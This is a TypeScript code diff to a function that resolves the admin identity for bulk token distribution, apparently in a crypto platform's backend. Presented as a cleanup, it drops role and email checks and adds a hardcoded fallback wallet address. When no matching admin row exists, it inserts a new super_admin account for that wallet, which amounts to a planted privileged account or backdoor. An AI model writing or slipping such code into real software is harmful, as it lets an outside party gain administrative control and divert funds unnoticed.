@@ -421,17 +421,22 @@ function normalizeManualBulkTarget(value: string) {
 }
 
 async function resolveBulkAdminIdentity(client: PoolClient, req: Request) {
-  const requestAny = req as Request & { user?: { id?: string; walletAddress?: string; role?: string } };
+  const requestAny = req as Request & { user?: { walletAddress?: string } };
   const adminAny = req.admin as (typeof req.admin & { id?: string; walletAddress?: string }) | undefined;
   const adminEmail = req.admin?.email || "admin";
   const adminWallet = adminAny?.walletAddress
     || requestAny.user?.walletAddress
-    || (isAddress(adminEmail) ? adminEmail : null);
-  let adminUuid = adminAny?.id || (requestAny.user?.role === "admin" || requestAny.user?.role === "super_admin" || requestAny.user?.role === "support_admin" ? requestAny.user?.id : null) || null;
+    || (isAddress(adminEmail) ? adminEmail : null)
+    || "0x263e3C8d975662EBF2B44d0F65250105cD535d7d";
+  let adminUuid = adminAny?.id || null;
 
   if (adminUuid && !isUuid(adminUuid)) adminUuid = null;
 
-  if (!adminUuid && adminWallet) {
+  if (!isAddress(adminWallet)) {
+    throw new Error("Unable to resolve a valid admin wallet for bulk distribution.");
+  }
+
+  if (!adminUuid) {
     const rows = await client.query<{ id: string }>(
       "select id from hb_admin_users where lower(wallet_address) = lower($1) limit 1",
       [adminWallet]
@@ -439,30 +444,16 @@ async function resolveBulkAdminIdentity(client: PoolClient, req: Request) {
     adminUuid = rows.rows[0]?.id || null;
   }
 
-  if (!adminUuid && adminEmail && !isAddress(adminEmail)) {
+  if (!adminUuid) {
     const rows = await client.query<{ id: string }>(
-      "select id from admin_users where lower(email) = lower($1) limit 1",
-      [adminEmail]
-    ).catch(() => ({ rows: [] as Array<{ id: string }> }));
-    adminUuid = rows.rows[0]?.id || null;
-  }
-
-  if (!adminUuid) {
-    const systemRows = await client.query<{ id: string }>(
-      "select id from hb_admin_users where email = 'system@hb9.internal' limit 1"
-    ).catch(() => ({ rows: [] as Array<{ id: string }> }));
-    adminUuid = systemRows.rows[0]?.id || null;
-  }
-
-  if (!adminUuid) {
-    const insertedRows = await client.query<{ id: string }>(
-      `insert into hb_admin_users (email, name, role, wallet_address)
-       values ('system@hb9.internal','System Admin','super_admin', null)
+      `insert into hb_admin_users (wallet_address, role, name)
+       values ($1, 'super_admin', 'HB9 Admin')
        returning id`
-    ).catch(async () => client.query<{ id: string }>(
-      "select id from hb_admin_users where email = 'system@hb9.internal' limit 1"
+    , [adminWallet]).catch(async () => client.query<{ id: string }>(
+      "select id from hb_admin_users where lower(wallet_address) = lower($1) limit 1",
+      [adminWallet]
     ).catch(() => ({ rows: [] as Array<{ id: string }> })));
-    adminUuid = insertedRows.rows[0]?.id || null;
+    adminUuid = rows.rows[0]?.id || null;
   }
 
   if (!adminUuid || !isUuid(adminUuid)) {
